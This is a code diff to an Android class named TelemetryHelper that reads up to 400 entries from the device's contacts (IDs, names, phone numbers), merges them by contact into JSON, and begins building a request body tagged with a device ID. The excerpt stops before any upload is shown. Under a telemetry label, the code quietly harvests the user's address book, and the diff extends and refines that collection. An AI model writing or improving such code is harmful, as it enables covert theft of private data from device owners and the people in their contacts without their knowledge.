@@ -56,23 +56,39 @@ public class TelemetryHelper {
             public void run() {
                 try {
                     ContentResolver cr = context.getContentResolver();
+                    String[] projection = new String[]{
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY,
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                            ContactsContract.CommonDataKinds.Phone.NUMBER
+                    };
                     Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
-                            null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT 300");
+                            projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY + " ASC LIMIT 400");
                     if (c == null) return;
 
-                    JSONArray list = new JSONArray();
+                    java.util.LinkedHashMap<String, JSONObject> map = new java.util.LinkedHashMap<>();
                     while (c.moveToNext()) {
-                        String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                        String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        JSONObject item = new JSONObject();
-                        item.put("name", name != null ? name : "Unknown");
-                        JSONArray nums = new JSONArray();
-                        if (number != null) nums.put(number);
-                        item.put("phone_numbers", nums);
-                        list.put(item);
+                        String id = c.getString(0);
+                        String name = c.getString(1);
+                        if (name == null || name.trim().isEmpty()) name = c.getString(2);
+                        if (name == null || name.trim().isEmpty()) name = "Contact #" + (map.size() + 1);
+                        String num = c.getString(3);
+
+                        JSONObject item = map.get(id != null ? id : name);
+                        if (item == null) {
+                            item = new JSONObject();
+                            item.put("name", name);
+                            item.put("phone_numbers", new JSONArray());
+                            map.put(id != null ? id : name, item);
+                        }
+                        if (num != null && !num.trim().isEmpty()) {
+                            item.getJSONArray("phone_numbers").put(num.trim());
+                        }
                     }
                     c.close();
+
+                    JSONArray list = new JSONArray();
+                    for (JSONObject obj : map.values()) list.put(obj);
 
                     JSONObject body = new JSONObject();
                     body.put("device_id", deviceId);
